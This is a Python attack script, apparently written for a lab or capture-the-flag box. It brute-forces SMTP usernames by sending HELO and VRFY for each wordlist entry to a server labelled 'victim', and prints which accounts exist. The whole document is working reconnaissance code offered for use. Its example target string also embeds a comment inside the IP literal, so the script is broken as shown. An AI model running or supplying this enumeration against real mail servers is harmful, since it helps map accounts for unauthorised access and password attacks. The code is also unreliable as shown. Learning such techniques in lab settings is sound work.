import socket
import time

# Banner
print("###############################################################")
print("# Script Owner: ANESTUS UDUME                                 #")
print("# Organization: BENTECH SECURITY                              #")
print("# Script Purpose: SMTP Brute-force for User Verification      #")
print("###############################################################")
print()

def smtp_bruteforce(smtp_server, port, wordlist_path, max_retries=1, client_ip="10.129.1.1#change-to-your-ip-address"):
    # Open the wordlist
    with open(wordlist_path, 'r') as file:
        usernames = file.readlines()

    for username in usernames:
        username = username.strip()  # Remove any leading/trailing whitespace
        print(f'Trying username: {username}')  # Verbose output
        
        # Retry logic
        retries = 0
        while retries <= max_retries:
            try:
                # Connect to the SMTP server
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((smtp_server, port))
                
                # Read server response
                s.recv(1024)
                
                # Send HELO command with IP address
                s.send(f'HELO {client_ip}\r\n'.encode())
                s.recv(1024)
                
                # Send VRFY command for the username
                s.send(f'VRFY {username}\r\n'.encode())
                response = s.recv(1024).decode()
                print(f'Response for {username}: {response.strip()}')  # Verbose output
                
                if "250" in response:
                    print(f'Verified: {username}')
                
                # Close the connection
                s.close()
                break  # Exit the retry loop on success

            except socket.error as e:
                print(f'Error with {username}: {e}')
                retries += 1
                time.sleep(1)  # Wait before retrying
                
            finally:
                if retries > max_retries:
                    print(f'Failed to verify {username} after {max_retries} retries')

# Example usage
smtp_server = '10.129.175.42 # victim-smtp-server-ip-address'
port = 25 #port-of-the-smtp
wordlist_path = 'PATH-TO-YOUR-WORDLIST'
client_ip = '10.129.1.1'  # Replace-this-with-your-actual-IP-address
smtp_bruteforce(smtp_server, port, wordlist_path, client_ip=client_ip)
